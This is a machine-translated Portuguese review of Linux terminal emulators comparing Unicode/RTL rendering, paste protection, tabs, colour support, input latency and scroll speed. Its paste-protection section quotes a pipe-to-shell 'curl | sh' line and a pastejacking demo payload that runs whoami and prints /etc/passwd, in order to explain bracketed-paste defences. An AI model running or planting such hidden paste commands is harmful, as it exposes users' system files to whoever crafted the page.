<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üññüèø üî¥ ‚òùüèø Vis√£o geral dos emuladores de terminal üöù üóìÔ∏è üëáüèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Algumas palavras do nosso departamento de tradu√ß√£o: geralmente todo mundo quer traduzir os materiais e publica√ß√µes mais recentes, e n√£o somos exce√ß√£o....">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Vis√£o geral dos emuladores de terminal</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/itsumma/blog/463785/"> <i>Algumas palavras do nosso departamento de tradu√ß√£o: geralmente todo mundo quer traduzir os materiais e publica√ß√µes mais recentes, e n√£o somos exce√ß√£o.</i>  <i>Mas os terminais n√£o s√£o atualizados com uma vez por semana.</i>  <i>Portanto, traduzimos para voc√™ um artigo de Antoine Bopre publicado na primavera de 2018: apesar da s√≥lida ‚Äúera‚Äù pelos padr√µes modernos, em nossa opini√£o, o material n√£o perdeu completamente sua relev√¢ncia.</i>  <i>Al√©m disso, o original √© uma s√©rie de dois artigos, mas decidimos combin√°-los em um grande post.</i> <br><br><img src="https://habrastorage.org/webt/_4/qm/3j/_4qm3jhmwxnoyxqc6jblinmiuoa.jpeg"><br><br>  Os terminais ocupam um lugar especial na hist√≥ria do computador, mas nas √∫ltimas d√©cadas eles foram "for√ßados" a sobreviver literalmente junto com a linha de comando no contexto de interfaces gr√°ficas onipresentes.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Os emuladores de terminal</a> substitu√≠ram seus <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">equivalentes de hardware</a> , que, por sua vez, eram uma modifica√ß√£o de sistemas em cart√µes perfurados e interruptores.  As distribui√ß√µes modernas v√™m com uma s√©rie de emuladores de terminal de todas as formas e cores.  E embora muitos estejam silenciosamente satisfeitos com o terminal padr√£o fornecido por seu ambiente de trabalho, alguns se orgulham de usar um software francamente ex√≥tico para iniciar seu shell ou editor de texto favorito.  Mas, como veremos neste artigo, nem todos os terminais foram criados com a mesma imagem e semelhan√ßa: eles variam muito em funcionalidade, tamanho e desempenho. <br><a name="habracut"></a><br><br>  Alguns terminais possuem brechas de seguran√ßa surpreendentes, al√©m disso, a maioria possui um conjunto de fun√ß√µes completamente diferente, do suporte √† interface com guias at√© o script.  Embora tenhamos <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">analisado emuladores de terminal no passado distante</a> , este artigo √© uma atualiza√ß√£o do material anterior que ajudar√° os leitores a determinar qual terminal usar em 2018.  A primeira metade do artigo compara fun√ß√µes e a segunda metade avalia o desempenho. <br><br>  Aqui est√£o os terminais que revi: <br><br><img src="https://habrastorage.org/webt/c4/3l/gy/c43lgydftmr0spxf35oq3vgyozy.jpeg"><br><br>  Talvez essas n√£o sejam as vers√µes mais recentes, j√° que me limitei √†s vers√µes est√°veis ‚Äã‚Äãno momento em que escrevi, que pude lan√ßar no Debian 9 ou no Fedora 27. A √∫nica exce√ß√£o √© Alacritty.  Ele √© descendente de terminais com acelera√ß√£o de GPU e est√° escrito em um novo e incomum idioma para esta tarefa - Rust.  Exclu√≠ os terminais da web da minha an√°lise (inclusive no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Electron</a> ), porque os testes preliminares mostraram seu desempenho extremamente ruim. <br><br><h4>  Suporte Unicode </h4><br>  Comecei meus testes com suporte a Unicode.  O primeiro teste do terminal foi exibir uma string Unicode de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">um artigo da Wikipedia</a> : "√©, Œî ,,, ◊ß, ŸÖ, ‡πó, „ÅÇ, Âè∂, Ëëâ e Îßê".  Este teste simples mostra se o terminal pode funcionar corretamente em todo o mundo.  O terminal xterm n√£o exibe o s√≠mbolo √Årabe <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Mem</a> na configura√ß√£o padr√£o: <br><br><img src="https://habrastorage.org/webt/gv/no/zm/gvnozm-mh17i-33qam74-r2i8n0.png"><br><br>  Por padr√£o, o xterm usa a fonte "fixa" cl√°ssica, que, segundo o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Wiki</a> , tem "cobertura Unicode significativa desde 1997".  Algo acontece nessa fonte que faz com que o caractere apare√ßa como um quadro vazio e somente quando a fonte de texto √© aumentada para mais de 20 pontos √© que o caractere finalmente come√ßa a ser exibido corretamente.  No entanto, essa "corre√ß√£o" interrompe a exibi√ß√£o de outros caracteres Unicode: <br><br><img src="https://habrastorage.org/webt/ke/lt/oe/keltoepwoz-dt_388rrmzaw7xy0.png"><br><br>  Essas capturas de tela foram tiradas no Fedora 27, pois deu melhores resultados que o Debian 9, onde algumas vers√µes mais antigas de terminais (especificamente mlterm) n√£o podiam funcionar corretamente com fontes.  Felizmente, isso foi corrigido em vers√µes posteriores. <br><br>  Agora preste aten√ß√£o ao mapeamento de strings no xterm.  Acontece que o s√≠mbolo Mem e o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Qoph</a> sem√≠tico subsequente pertencem aos scripts RTL (da <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">direita para a esquerda</a> ); portanto, tecnicamente, eles devem ser exibidos da direita para a esquerda.  Navegadores da Web, como o Firefox 57, manipulam corretamente a linha acima.  Uma vers√£o mais simples do texto RTL √© a palavra " <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Sarah</a> " em hebraico ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">◊©◊®◊î</a> ).  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">A p√°gina wiki bidirecional</a> diz o seguinte: <br><blockquote>  ‚ÄúMuitos programas de computador n√£o podem exibir corretamente o texto bidirecional.  Por exemplo, o nome hebraico ‚ÄúSarah‚Äù consiste nos s√≠mbolos sin (◊©) (que aparece √† direita), depois resh (◊®) e, finalmente, heh (◊î) (que deve aparecer √† esquerda). ‚Äù </blockquote><br>  Muitos terminais falham neste teste: Alacritty, os terminais derivados do VTE, Gnome e XFCE, urxvt, st e xterm, exibem "Sarah" na ordem inversa, como se escrev√™ssemos esse nome como "Aras". <br><br><img src="https://habrastorage.org/webt/z4/yw/gi/z4ywgic4drs6yom_j1xxlnvgh5e.png"><br><br>  Outro problema com os textos bidirecionais √© que eles precisam estar alinhados de alguma forma, especialmente quando se trata de misturar textos RTL e LTR.  Os scripts RTL devem ser executados no lado direito da janela do terminal, mas o que deve acontecer para os terminais que usam o LTR English por padr√£o?  A maioria deles n√£o possui mecanismos especiais e alinha o texto inteiro √† esquerda (incluindo o Konsole).  As exce√ß√µes s√£o pterm e mlterm, que seguem os padr√µes e alinham essas linhas √† direita. <br><br><img src="https://habrastorage.org/webt/ji/9b/xx/ji9bxx3oy7oqjavtph7zjajxwhq.png"><br><br><h4>  Prote√ß√£o de inser√ß√£o </h4><br>  O pr√≥ximo recurso cr√≠tico que eu determinei para mim mesmo √© a prote√ß√£o contra inser√ß√£o.  Embora seja sabido que feiti√ßos como: <br><br><pre><code class="plaintext hljs">$ curl http://example.com/ | sh</code> </pre> <br>  s√£o comandos de execu√ß√£o de c√≥digo push; poucas pessoas sabem que comandos ocultos podem penetrar no console ao copiar e colar de um navegador da web, mesmo ap√≥s uma inspe√ß√£o completa.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">O site de testes de Gianna Horne</a> mostra brilhantemente como a equipe √© inofensiva: <br><br><pre> <code class="plaintext hljs">git clone git: //git.kernel.org/pub/scm/utils/kup/kup.git</code> </pre> <br>  isso se torna um inc√¥modo ao colar do site da Horn no terminal: <br><br><pre> <code class="plaintext hljs">git clone /dev/null; clear; echo -n "Hello "; whoami|tr -d '\n'; echo -e '!\nThat was a bad idea. Don'"'"'t copy code from websites you don'"'"'t trust! \ Here'"'"'s the first line of your /etc/passwd: '; head -n1 /etc/passwd git clone git://git.kernel.org/pub/scm/utils/kup/kup.git</code> </pre> <br>  Como isso funciona?  O c√≥digo malicioso √© colocado no bloco <b>&lt;span&gt;</b> , que √© movido do campo de vis√£o do usu√°rio usando CSS. <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">O modo de pasta entre colchetes foi</a> claramente projetado para neutralizar esses ataques.  Nesse modo, os terminais envolvem o texto inserido em um par de seq√º√™ncias de escape especiais para informar o shell sobre a origem desse texto.  Portanto, o shell recebe um sinal de que pode ignorar caracteres especiais que o texto inserido pode conter.  Todos os terminais, at√© o vener√°vel xterm, suportam esta fun√ß√£o, mas a inser√ß√£o no modo entre colchetes requer suporte para um shell ou aplicativo em execu√ß√£o no terminal.  Por exemplo, o software que usa o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">GNU Readline</a> (o mesmo Bash) precisa de um <b>arquivo ~ / .inputrc</b> : <br><br><pre> <code class="plaintext hljs">set enable-bracketed-paste on</code> </pre> <br>  Infelizmente, o site de teste do Horn tamb√©m mostra como contornar essa prote√ß√£o formatando o pr√≥prio texto e finalizando prematuramente a aplica√ß√£o do modo Bracketed.  Isso funciona porque alguns terminais n√£o filtram corretamente as seq√º√™ncias de escape antes de adicionar suas pr√≥prias.  Por exemplo, no meu, n√£o foi poss√≠vel concluir com √™xito os testes do Konsole, mesmo levando em considera√ß√£o a configura√ß√£o correta do arquivo <b>.inputrc</b> .  Isso significa que voc√™ pode facilmente obter danos √† configura√ß√£o do sistema devido a um aplicativo n√£o suportado ou a um shell configurado incorretamente.  Isso √© especialmente perigoso ao entrar em servidores remotos, onde um estudo cuidadoso da configura√ß√£o √© menos comum, especialmente se voc√™ tiver muitas dessas m√°quinas remotas. <br><br>  Uma boa solu√ß√£o para esse problema √© o plug-in de confirma√ß√£o de colagem para o terminal <b>urxvt</b> , que simplesmente pede permiss√£o para colar qualquer texto que contenha novas linhas.  N√£o encontrei uma op√ß√£o mais segura para o ataque de texto descrito por Horn. <br><br><h4>  Guias e perfis </h4><br>  Um recurso popular agora √© oferecer suporte a uma interface com guias, que definiremos como uma janela de terminal contendo mais alguns terminais.  Essa fun√ß√£o √© diferente para terminais diferentes e, embora terminais tradicionais como o xterm n√£o suportem guias, as encarna√ß√µes de terminal mais modernas representadas pelo Xfce Terminal, GNOME Terminal e Konsole t√™m essa fun√ß√£o.  O Urxvt tamb√©m tem suporte para guias, mas apenas se o plug-in for usado.  Por√©m, em termos de guias de suporte, o Terminator √© o l√≠der indiscut√≠vel: ele n√£o apenas suporta guias, mas tamb√©m pode organizar terminais em qualquer ordem (veja a imagem abaixo). <br><br><img src="https://habrastorage.org/webt/eq/2s/_f/eq2s_fad0t8_7v6uymzkg7xndvs.png"><br><br>  Outro recurso do Terminator √© a capacidade de "agrupar" essas guias e enviar as mesmas teclas para v√°rios terminais ao mesmo tempo, o que fornece uma ferramenta aproximada para executar opera√ß√µes em massa em v√°rios servidores simultaneamente.  Um recurso semelhante tamb√©m √© implementado no Konsole.  Para usar esta fun√ß√£o em outros terminais, voc√™ deve usar software de terceiros, como <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Cluster SSH</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">xlax</a> ou <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">tmux</a> . <br><br>  As guias funcionam especialmente bem em conjunto com os perfis: por exemplo, voc√™ pode ter uma guia para email, outra para bate-papo e assim por diante.  Isso √© bem suportado pelo Konsole e pelo GNOME Terminal.  Ambos permitem que cada guia inicie automaticamente seu perfil.  O Terminator tamb√©m suporta perfis, mas n√£o consegui encontrar uma maneira de iniciar automaticamente determinados programas quando abro uma determinada guia.  Outros terminais n√£o t√™m o conceito de perfil. <br><br><h4>  Ryushechki </h4><br>  A √∫ltima coisa que considerarei na primeira parte deste artigo √© a apar√™ncia dos terminais.  Por exemplo, o GNOME, o Xfce e o urxvt oferecem suporte √† transpar√™ncia, mas recentemente eliminaram o suporte para imagens de segundo plano, for√ßando alguns usu√°rios a mudarem para o terminal <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Tilix</a> .  Pessoalmente, estou feliz com apenas <b>Xresources</b> , que define o conjunto b√°sico de cores de plano de fundo para o urxvt.  No entanto, temas de cores personalizadas podem causar problemas.  Por exemplo, o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Solarized</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">n√£o funciona</a> com <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aplicativos htop</a> e <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">IPTraf</a> , pois eles j√° usam suas pr√≥prias cores. <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">O terminal VT100 original</a> n√£o suporta cores, e os novos geralmente s√£o limitados a uma paleta de 256 cores.  Para usu√°rios avan√ßados que estilizam seus terminais, solicita√ß√µes de shell ou barras de status de algumas maneiras complexas podem ser uma limita√ß√£o desagrad√°vel.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">O Gist</a> monitora quais terminais t√™m suporte para True Color.  Meus testes confirmam que os terminais baseados em st, Alacritty e VTE suportam perfeitamente o True Color.  Outros terminais nesse sentido n√£o se sentem muito bem e na verdade nem exibem 256 cores.  Abaixo, voc√™ pode ver a diferen√ßa entre o suporte True Color nos terminais GNOME, st e xterm, que fazem um bom trabalho com sua paleta de 256 cores e o urxvt, que n√£o apenas falha no teste, mas tamb√©m mostra alguns caracteres piscantes. eles. <br><br><img src="https://habrastorage.org/webt/3u/go/mq/3ugomq0evrr7ql1h9xsapwjp_om.png"><br><br>  Alguns terminais tamb√©m analisam o texto em busca de padr√µes de URL para tornar os links clic√°veis.  Isso se aplica a todos os terminais derivados do VTE, enquanto o urxvt requer um plug-in especial que transforma URLs com um clique ou um atalho de teclado.  Outros terminais que testei exibem URLs de outras maneiras. <br><br>  Finalmente, uma nova tend√™ncia para terminais √© a op√ß√£o de buffer de rolagem.  Por exemplo, em st n√£o h√° buffer de rolagem;  assume-se que o usu√°rio utilizar√° um multiplexador de terminal como o tmux e o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">GNU Screen</a> . <br><br>  O Alacritty tamb√©m n√£o possui buffers de rolagem reversa, mas o suporte <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ser√° adicionado</a> em <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">breve</a> devido ao "amplo feedback" dos usu√°rios sobre este t√≥pico.  Al√©m dessas novas empresas, todos os terminais que testei que encontrei suportam rolagem para tr√°s. <br><br><h4>  Subtotais </h4><br>  Na segunda parte do material ( <i>no original, eram dois artigos diferentes, - aprox. Por.</i> ) Compararemos desempenho, uso de mem√≥ria e atraso.  Mas j√° vemos que alguns dos terminais em quest√£o apresentam s√©rias defici√™ncias.  Por exemplo, os usu√°rios que trabalham regularmente com scripts RTL podem prestar aten√ß√£o ao mlterm e pterm, pois lidam melhor com essas tarefas do que outros.  O Konsole tamb√©m teve um bom desempenho.  Usu√°rios que n√£o trabalham com scripts RTL podem escolher outra coisa. <br><br>  Do ponto de vista da seguran√ßa contra a inser√ß√£o de c√≥digo malicioso, o urxvt se destaca por causa de sua implementa√ß√£o especial de prote√ß√£o contra esse tipo de ataque, o que me parece definitivamente conveniente.  Quem procura sinos e assobios deve olhar para o Konsole.  Por fim, vale ressaltar que o VTE √© uma excelente base para terminais, o que garante suporte a cores, reconhecimento de URL e assim por diante.  √Ä primeira vista, o terminal padr√£o que acompanha o seu ambiente favorito pode atender a todos os requisitos, mas vamos deixar essa pergunta em aberto at√© descobrirmos o desempenho. <br><br><h4>  <i>Continue a conversa</i> </h4><br>  Em geral, o desempenho do terminal por si s√≥ pode parecer um problema absurdo; no entanto, alguns deles demonstram um atraso surpreendentemente grande para softwares desse tipo fundamental.  Tamb√©m veremos o que √© tradicionalmente chamado de "velocidade" (na verdade, √© a velocidade de rolagem) e o consumo de mem√≥ria do terminal (considerando que hoje n√£o √© t√£o cr√≠tico quanto d√©cadas atr√°s). <br><br><h4>  Atraso </h4><br>  Ap√≥s um estudo minucioso do desempenho do terminal, cheguei √† conclus√£o de que o par√¢metro mais importante nesse sentido √© o tamanho do atraso (ping).  Em seu artigo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">‚ÄúImprimimos com prazer‚Äù,</a> Pavel Fatin examinou o atraso de v√°rios editores de texto e sugeriu que os terminais nesse sentido podem funcionar mais lentamente do que os editores de texto mais r√°pidos.  Foi essa dica que me levou a lan√ßar meus pr√≥prios testes e escrever este artigo. <br><br>  Mas o que √© um atraso e por que √© t√£o importante?  Em seu artigo, Fatin definiu como "o atraso entre pressionar uma tecla e a atualiza√ß√£o da tela correspondente" e citou o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">"Manual sobre intera√ß√£o homem-computador"</a> , dizendo: "O atraso no feedback visual na tela do computador tem um efeito importante no comportamento da digitadora e em sua satisfa√ß√£o. " <br><br>  Fatin explica que esse ping tem consequ√™ncias mais profundas do que apenas satisfa√ß√£o: "a digita√ß√£o se torna mais lenta, ocorrem mais erros, a tens√£o nos olhos e nos m√∫sculos aumenta".  Em outras palavras, um grande atraso pode levar a erros de digita√ß√£o, bem como uma diminui√ß√£o na qualidade do c√≥digo, pois leva a uma carga cognitiva adicional no c√©rebro.  Pior ainda, o ping "aumenta a tens√£o dos olhos e m√∫sculos", o que, aparentemente, implica o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">desenvolvimento de les√µes profissionais</a> no futuro ( <i>aparentemente, o autor quer dizer problemas nos m√∫sculos dos olhos, costas, bra√ßos e, √© claro, vis√£o, - aprox. por.</i> ) Devido ao estresse repetitivo. <br><br>  Alguns desses efeitos s√£o conhecidos h√° muito tempo, e os resultados de um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">estudo</a> publicado em 1976 na revista Ergonomics dizem que um atraso de 100 milissegundos "piora significativamente a velocidade da discagem".  Mais recentemente, <a href="">um tempo</a> de <a href="">resposta aceit√°vel</a> de 10 milissegundos foi introduzido no guia do usu√°rio do GNOME e, se formos mais longe, a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Microsoft Research</a> mostra que 1 milissegundo √© ideal. <br><br>  Fatin realizou seus testes em editores de texto;  ele criou uma ferramenta port√°til chamada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Typometer</a> , que eu usei para testar o ping em emuladores de terminal.  Lembre-se de que o teste foi realizado no modo de simula√ß√£o: na realidade, tamb√©m precisamos considerar o atraso de entrada (teclado, controlador USB etc.) e sa√≠da (buffer da placa de v√≠deo, monitor).  Segundo Fatin, em configura√ß√µes t√≠picas √© de cerca de 20 ms.  Se voc√™ tiver equipamento de jogos, poder√° obter um indicador de apenas 3 milissegundos.  Como j√° temos equipamentos t√£o r√°pidos, o aplicativo tamb√©m n√£o deve apresentar seu atraso.  O objetivo de Fatin √© atrasar o aplicativo em at√© 1 milissegundo ou obter discagem sem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">atraso mensur√°vel</a> , como no <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">IntelliJ IDEA 15</a> . <br><br>  E aqui est√£o os resultados de minhas medi√ß√µes, bem como alguns resultados de Fatin, a fim de mostrar que meu experimento √© consistente com seus testes: <br><br><img src="https://habrastorage.org/webt/4s/u-/vn/4su-vnzyvqb35-uwp0ywpq2g76e.jpeg"><br><br>  A primeira coisa que me impressionou foi o melhor tempo de resposta para programas mais antigos, como xterm e mlterm.  Com a pior lat√™ncia de registro (2,4 ms), eles apresentaram melhores resultados do que o terminal moderno mais r√°pido (10,6 ms por st).  Nem um √∫nico terminal moderno cai abaixo de um limite de 10 milissegundos.  Em particular, a Alacritty n√£o atende aos requisitos para o "emulador de terminal existente mais r√°pido", embora seus resultados tenham melhorado desde a primeira verifica√ß√£o em 2017.  De fato, os autores do projeto <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">est√£o cientes da situa√ß√£o</a> e est√£o trabalhando para melhorar a exibi√ß√£o.  Tamb√©m deve ser observado que o Vim usando o GTK3 √© uma ordem de magnitude mais lenta que o seu equivalente no GTK2.  A partir disso, podemos concluir que o GTK3 cria um atraso adicional, e isso se reflete em todos os outros terminais que o utilizam (Terminator, Xfce4 Terminal e GNOME). <br><br>  No entanto, as diferen√ßas podem n√£o ser vis√≠veis aos olhos.  Como explica Fatin: "N√£o √© necess√°rio estar ciente do atraso para que ele tenha um efeito sobre voc√™".  Fatin tamb√©m alerta para um desvio padr√£o: "Quaisquer irregularidades na dura√ß√£o do atraso (instabilidade) criam uma carga adicional devido √† sua imprevisibilidade". <br><br><img src="https://habrastorage.org/webt/dq/a4/0v/dqa40vpdfz4k9uctottd6h9j2we.png"><br><br>  O gr√°fico acima foi tirado no Debian 9 puro (stretch) com o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">gerenciador de janelas i3</a> .  Esse ambiente fornece os melhores resultados em testes de atraso.  Como se viu, o GNOME cria um ping extra de 20 ms para todas as dimens√µes.  Uma poss√≠vel explica√ß√£o para isso √© a presen√ßa de programas com processamento s√≠ncrono de eventos de entrada.  Fatin cita um exemplo do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Workrave</a> para este caso, que adiciona um atraso ao processar todos os eventos de entrada de forma s√≠ncrona.  Por padr√£o, o GNOME tamb√©m possui um gerenciador de janelas <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Mutter</a> que cria um n√≠vel extra de buffer, que afeta o ping e adiciona um atraso m√≠nimo de 8 milissegundos. <br><br><img src="https://habrastorage.org/webt/ec/t9/ap/ect9apxhg0v5l0_q04qujn5xu4k.png"><br><br><h4>  Velocidade de rolagem </h4><br>  O pr√≥ximo teste √© o teste tradicional de "velocidade" ou "largura de banda", que mede a rapidez com que o terminal pode rolar por uma p√°gina, exibindo uma grande quantidade de texto na tela.  A mec√¢nica do teste varia;  o teste original era apenas gerar a mesma sequ√™ncia de texto com o comando seq.  Outros testes incluem um teste de Thomas E. Dickey (o mantenedor do xterm), que <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">baixa</a> repetidamente <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">o arquivo terminfo.src</a> .  Em outra an√°lise de desempenho do terminal, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Den Luu</a> usa uma cadeia de bytes aleat√≥rios codificada em base32, que √© enviada ao terminal usando cat.  Luu considera que esse teste √© "t√£o in√∫til quanto se pode imaginar" e sugere usar a resposta do terminal como o principal indicador.  Dickey tamb√©m considera seu teste enganoso.  No entanto, os dois autores reconhecem que a largura de banda da janela do terminal pode ser um problema.  Luu encontrou o Emacs Eshell congelando ao exibir arquivos grandes, e Dickie otimizou o terminal para se livrar da lentid√£o visual do xtrerm.  Portanto, ainda h√° algumas raz√µes para esse teste, mas como o processo de renderiza√ß√£o √© muito diferente de terminal para terminal, ele tamb√©m pode ser usado como um componente de teste para verificar outros par√¢metros. <br><br><img src="https://habrastorage.org/webt/4z/ov/rx/4zovrxmlnbnwpbzhnebcp412yf0.png"><br><br>  Aqui vemos que rxvt e st est√£o √† frente da concorr√™ncia, seguidos pela muito mais recente Alacritty, que est√° sendo desenvolvida com foco na velocidade.  Em seguida, v√™m o Xfce (fam√≠lia VTE) e o Konsole, que funcionam quase o dobro da velocidade.  O √∫ltimo √© xterm, com um √≠ndice cinco vezes mais lento que o rxvt.  Durante o teste, o xterm tamb√©m ondulou, era dif√≠cil ver o texto que passava, mesmo que fosse a mesma linha.  O Konsole acabou sendo r√°pido, mas √†s vezes era "complicado": a tela pendia de vez em quando, mostrando o texto parcialmente ou n√£o exibindo nada.  Outros terminais exibiam strings claramente, incluindo st, Alacritty e rxvt. <br><br>  Dickie explica que as diferen√ßas de desempenho est√£o relacionadas ao design de buffers de rolagem em diferentes terminais.  Em particular, ele acusa o rxvt e outros terminais de "n√£o seguir as regras gerais": <br><blockquote>  ‚ÄúAo contr√°rio do xterm, o rxvt n√£o tentou exibir todas as atualiza√ß√µes.  Se ele ficar para tr√°s, ele descartar√° algumas atualiza√ß√µes para recuperar o atraso.  Isso teve um efeito maior na velocidade de rolagem imagin√°ria do que na organiza√ß√£o da mem√≥ria interna.  Uma desvantagem foi que a anima√ß√£o ASCII era um tanto imprecisa. 